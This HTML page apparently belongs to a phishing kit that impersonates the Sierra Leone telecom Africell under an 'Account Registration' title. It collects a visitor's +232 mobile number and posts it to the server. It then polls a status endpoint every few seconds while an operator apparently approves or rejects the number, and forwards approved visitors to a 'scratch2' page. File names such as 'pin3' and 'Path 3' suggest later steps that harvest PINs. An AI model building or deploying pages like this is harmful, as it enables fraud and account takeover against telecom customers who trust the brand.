<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Africell | Account Registration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        html, body { width: 100%; height: 100%; background: #F2F2F2; overflow-x: hidden; }
        .forgot-wrapper { width: 100%; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
        
        /* Solid Purple Header */
        .forgot-header { width: 100%; height: 70px; background: #991676; display: flex; align-items: center; padding: 0 20px; }
        .back-arrow { color: #ffffff; font-size: 22px; text-decoration: none; display: flex; align-items: center; justify-content: center; width: 35px; height: 35px; }
        
        /* Main Content Container with Side White Space Margins */
        .forgot-content { width: 100%; max-width: 440px; display: flex; flex-direction: column; align-items: center; padding: 0 24px; margin: 0 auto; }
        
        /* Heading & Instructions */
        .forgot-title { font-size: 26px; font-weight: 700; color: #000000; text-align: center; margin-top: 40px; margin-bottom: 12px; }
        .forgot-instruction { font-size: 14px; color: #555555; text-align: center; font-weight: 400; margin-bottom: 30px; }
        
        /* Input Row Container */
        .forgot-input-row { display: flex; gap: 12px; width: 100%; margin-bottom: 24px; }
        
        /* Country Code Box */
        .forgot-prefix-box { width: 90px; height: 56px; background: #ffffff; border: 2px solid #991676; border-radius: 14px; font-size: 15px; font-weight: 700; color: #000000; display: flex; align-items: center; justify-content: center; }
        
        /* Mobile Number Input Box */
        .forgot-input-field { flex: 1; height: 56px; background: #ffffff; border: 2px solid #991676; border-radius: 14px; font-size: 16px; font-weight: 600; color: #000000; text-align: center; outline: none; }
        .forgot-input-field::placeholder { color: #999999; font-weight: 400; text-align: center; }
        .forgot-input-field:focus { border-color: #79105c; }

        /* Send Button */
        .forgot-send-btn { width: 100%; height: 54px; background: #991676; color: #ffffff; border: none; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; text-decoration: none; box-shadow: 0 4px 12px rgba(153, 22, 118, 0.2); transition: background 0.2s ease; }
        .forgot-send-btn:hover { background: #79105c; }
        .forgot-send-btn.disabled-state { opacity: 0.4; filter: blur(1.5px); pointer-events: none; cursor: not-allowed; box-shadow: none !important; }

        /* Loading Spinner */
        #loadingSpinner { display: none; flex-direction: row; align-items: center; justify-content: center; gap: 12px; margin-top: 20px; font-size: 14px; color: #991676; font-weight: 600; }
        .spinner { width: 22px; height: 22px; border: 3px solid rgba(153, 22, 118, 0.2); border-top: 3px solid #991676; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Custom Modal Dialog */
        #customModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(153, 22, 118, 0.9); backdrop-filter: blur(8px); justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
        .modal-card { background: #991676; width: 100%; max-width: 320px; border-radius: 20px; padding: 24px; text-align: center; color: #ffffff; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); }
        .modal-message { font-size: 15px; font-weight: 600; margin-bottom: 20px; line-height: 1.4; }
        .modal-btn { background: #ffd34d; color: #5E0C44; border: none; border-radius: 12px; padding: 12px 24px; font-size: 15px; font-weight: 700; cursor: pointer; width: 100%; box-shadow: 0 4px 12px rgba(255, 211, 77, 0.3); }
        .modal-btn:active { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="forgot-wrapper">
        <!-- Back arrow updated to point to pin3.html for Path 3 -->
        <header class="forgot-header">
            <a href="pin3.html" class="back-arrow"><i class="fa-solid fa-arrow-left"></i></a>
        </header>

        <div class="forgot-content">
            <h1 class="forgot-title">Mobile Number</h1>
            <p class="forgot-instruction">Please Enter your mobile number</p>

            <div class="forgot-input-row">
                <div class="forgot-prefix-box">+232</div>
                <input type="tel" id="recoveryPhone" class="forgot-input-field" placeholder="Mobile Number" maxlength="9" inputmode="numeric" pattern="[0-9]*" required>
            </div>

            <!-- Send Button -->
            <button type="button" id="sendBtn" class="forgot-send-btn">send</button>

            <!-- Loading Spinner -->
            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span>Checking account status...</span>
            </div>
        </div>
    </div>

    <!-- Custom Modal Dialog -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        let pendingAction = null;

        function showAppAlert(message, actionCallback = null) {
            document.getElementById('modalText').innerText = message;
            document.getElementById('customModal').style.display = 'flex';
            pendingAction = actionCallback;
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
            if (pendingAction) {
                pendingAction();
                pendingAction = null;
            }
        }

        function isValidSierraLeonePhone(number) {
            const cleaned = number.replace(/[\s-]/g, '');
            return /^\d{8,9}$/.test(cleaned);
        }

        async function submitRecoveryPhone() {
            const rawPhone = document.getElementById('recoveryPhone').value.trim();
            const sendBtn = document.getElementById('sendBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');

            if (!rawPhone || !isValidSierraLeonePhone(rawPhone)) {
                showAppAlert('❌ Enter Correct Africell Number');
                return;
            }

            const fullPhone = '+232' + rawPhone;
            localStorage.setItem('africellUserPhone', fullPhone);
            localStorage.setItem('userPhone', fullPhone);

            try {
                sendBtn.classList.add('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'flex';

                // Fixed uniqueId to match account registration flow instead of password recovery
                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: fullPhone, uniqueId: 'Account Registration Request' })
                });

                const result = await response.json();

                if (result.success) {
                    console.log('✅ Order submitted successfully. Starting status poll for:', fullPhone);
                    pollApprovalStatus(fullPhone);
                } else {
                    sendBtn.classList.remove('disabled-state');
                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                    showAppAlert('❌ Submission failed. Please try again.');
                }
            } catch (error) {
                console.error('Connection Error:', error);
                sendBtn.classList.remove('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'none';
                showAppAlert('Could not connect.');
            }
        }

        function pollApprovalStatus(phone) {
            const cleanPhone = phone.trim();
            const sendBtn = document.getElementById('sendBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');

            const statusInterval = setInterval(async () => {
                try {
                    const checkUrl = `/api/check-status?phone=${encodeURIComponent(cleanPhone)}`;
                    const response = await fetch(checkUrl);
                    const data = await response.json();

                    console.log('Polling server status response:', data);

                    if (data.status === 'approved') {
                        clearInterval(statusInterval);
                        window.location.href = 'scratch2.html';
                    } 
                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
                        clearInterval(statusInterval);
                        if (spinnerDiv) spinnerDiv.style.display = 'none';
                        sendBtn.classList.remove('disabled-state');
                        showAppAlert('❌ Number not recognized or rejected.', () => {
                            window.location.href = 'pin3.html';
                        });
                    }
                } catch (e) {
                    console.error('Polling network error:', e);
                }
            }, 3000);
        }

        // Attach event listener to the send button on page load
        document.addEventListener('DOMContentLoaded', () => {
            const sendBtn = document.getElementById('sendBtn');
            if (sendBtn) {
                sendBtn.addEventListener('click', submitRecoveryPhone);
            }
        });
    </script>
</body>
</html>
